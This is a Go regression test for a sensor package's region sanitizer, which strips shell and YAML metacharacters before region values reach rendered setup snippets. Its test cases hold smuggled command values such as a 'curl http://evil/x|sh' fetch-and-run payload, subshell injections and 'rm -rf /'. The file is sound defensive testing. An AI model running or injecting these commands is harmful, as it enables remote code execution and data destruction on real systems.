package sensor

import (
	"strings"
	"testing"
)

// TestSanitizeRegion is a regression test for the sensor-region template
// injection: a sensor-reported region is rendered verbatim by text/template
// into operator setup snippets (env/docker/yaml), so shell metacharacters must
// never survive ingest.
func TestSanitizeRegion(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"legit aws", "ap-southeast-1", "ap-southeast-1"},
		{"legit azure", "westeurope", "westeurope"},
		{"legit dotted", "us.east.2", "us.east.2"},
		{"empty", "", ""},
		{"shell injection", "ap-south-1;curl http://evil/x|sh #", "ap-south-1curlhttpevilxsh"},
		{"backtick", "a`id`b", "aidb"},
		{"dollar subshell", "a$(id)b", "aidb"},
		{"newline", "a\nexport X=y", "aexportXy"},
		{"quote breakout", "a\" b: c", "abc"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeRegion(tc.in)
			if got != tc.want {
				t.Fatalf("SanitizeRegion(%q) = %q, want %q", tc.in, got, tc.want)
			}
			// No shell/YAML-dangerous character may ever remain.
			if strings.ContainsAny(got, ";|&$`()<>\"'\\ \t\n\r#") {
				t.Fatalf("SanitizeRegion(%q) left a dangerous character: %q", tc.in, got)
			}
		})
	}
}

func TestSanitizeRegion_LengthCap(t *testing.T) {
	in := strings.Repeat("a", 200)
	got := SanitizeRegion(in)
	if len(got) != 64 {
		t.Fatalf("expected length cap 64, got %d", len(got))
	}
}

// TestUpdateMetrics_SanitizesRegion guards the entity setter path.
func TestUpdateMetrics_SanitizesRegion(t *testing.T) {
	a := &Sensor{}
	a.UpdateMetrics(1, 1, 0, "eu-west-1;rm -rf /")
	if strings.ContainsAny(a.Region, ";| ") {
		t.Fatalf("UpdateMetrics stored an unsanitized region: %q", a.Region)
	}
}
